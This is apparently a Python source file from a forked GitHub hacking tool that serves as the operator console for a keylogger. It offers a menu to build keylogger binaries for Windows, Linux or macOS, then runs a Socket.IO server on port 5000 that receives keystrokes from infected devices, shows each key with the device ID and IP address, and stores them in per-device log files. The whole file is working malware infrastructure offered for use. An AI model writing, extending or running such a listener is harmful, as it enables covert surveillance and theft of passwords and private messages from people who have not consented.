"""
Original Author : https://github.com/karthi-the-hacker
Fork Author     : https://github.com/minefarts
"""
from socketio import Server, WSGIApp
import eventlet, os, datetime, json
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

def get_os_type():
    while True:

        os_type = input("1 🖥️  Enter OS type (win/linux/mac): ").strip().lower()
        
        if os_type == 'x':
            return "exit"
        
        if os_type in ['win', 'linux', 'mac']:
            return os_type
        
        else:
            console.print("[bold red]❌ Invalid OS type. Please enter 'win', 'linux', or 'mac'.[/bold red]")

def input_instructions():

    console.print(Panel.fit(
        "[bold yellow]Instructions[/bold yellow]\n\n"
        "🖥️  [bold]Step :[/bold] Choose OS type → [green]win[/green], [green]linux[/green], or [green]mac[/green]\n\n"
        "❌ Enter [red]'x'[/red] to exit anytime",
        border_style="magenta"
    ))

def user_option():

    console.print(Panel.fit(
        "[bold cyan]Keylogger Options[/bold cyan]\n\n"
        "1️⃣  Create a new keylogger\n"
        "2️⃣  Start listening for an existing keylogger\n\n"
        "❌ Enter [red]'x'[/red] to exit anytime",
        border_style="magenta"
    ))

    while True:

        option = console.input("[bold green]👉 Enter your option:[/bold green] ").strip().lower()
        
        if option in ['1', '2', 'x']:
            return option
        
        else:
            console.print("[bold red]Invalid option. Please enter 1, 2, or 'x' to exit.[/bold red]")

def banner():
    console.print(Panel.fit(
        "⌨️ [bold green] keylogger[/bold green]",
        border_style="red"
    ))

def getio():

    banner()
    
    input_instructions()
    
    os_type = get_os_type()
    if os_type == "exit":
        return None
    
    return os_type

def compile_app(os_type:str):

    if os_type == "mac":
        file_ext = f"{os.getcwd()}/keylogger/build/keylogger_mac.dmg"
    
    elif os_type == "linux":
        file_ext = f"{os.getcwd()}/keylogger/build/keylogger_linux"
    
    elif os_type == "win":
        file_ext = f"{os.getcwd()}/keylogger/build/keylogger_win.exe"
    
    else:
        raise ValueError("Unsupported OS type")

    return file_ext

def start_keylogger_server():

    sio = Server()
    app = WSGIApp(sio)

    clients = {}
    
    # Create folders
    base_dir = os.path.join(os.getcwd(), "keylogger")
    devices_dir = os.path.join(base_dir, "devices")
    os.makedirs(devices_dir, exist_ok=True)

    # Initialize master JSON file
    master_file = os.path.join(base_dir, "keylogger.json")
    if not os.path.exists(master_file):
        with open(master_file, "w") as f:
            json.dump({
                "devices": [],
                "total_connected": 0,
                "last_connected_device": None
            }, f, indent=4)

    def load_master():
        with open(master_file, "r") as f:
            return json.load(f)

    def save_master(data):
        with open(master_file, "w") as f:
            json.dump(data, f, indent=4)

    @sio.event
    def connect(sid, environ):
        ip = environ['REMOTE_ADDR']
        clients[sid] = {
            "connected_at": datetime.datetime.now(),
            "ip": ip
        }

    @sio.event
    def disconnect(sid):
        clients.pop(sid, None)

    @sio.event
    def keypress(sid, data):
        device_id = data.get("device_id", "unknown")
        key = data.get("key", "?")
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = clients.get(sid, {}).get("ip", "unknown")

        # Print keylog info
        table = Table.grid()
        table.add_column(justify="left")
        table.add_column(justify="left")
        table.add_row("[bold cyan]🕒 Time:[/bold cyan]", f"{timestamp}")
        table.add_row("[bold green]💻 Device ID:[/bold green]", f"{device_id}")
        table.add_row("[bold magenta]🔑 Key Pressed:[/bold magenta]", f"{key}")
        table.add_row("[bold yellow]🌐 IP Address:[/bold yellow]", f"{ip}")
        console.print(Panel(table, title="📥 Keylog Received", border_style="green"))

        # Save to master
        master = load_master()
        if device_id not in master["devices"]:
            master["devices"].append(device_id)
            master["total_connected"] += 1
        master["last_connected_device"] = device_id
        save_master(master)

        # Save to device log file
        device_file = os.path.join(devices_dir, f"{device_id}.json")
        log_entry = {
            "timestamp": timestamp,
            "ip": ip,
            "key": key
        }

        if os.path.exists(device_file):
            with open(device_file, "r") as f:
                device_logs = json.load(f)
        else:
            device_logs = []

        device_logs.append(log_entry)

        with open(device_file, "w") as f:
            json.dump(device_logs, f, indent=4)

    # Display listener menu at top
    console.print(Panel.fit(
        "[bold green]🎧 Keylogger Listener Started[/bold green]\n"
        "[bold red]❌ Press Ctrl+C to stop the server[/bold red]",
        title="🟢 Server Status",
        border_style="bright_blue"
    ))

    # Start the server
    eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), app)
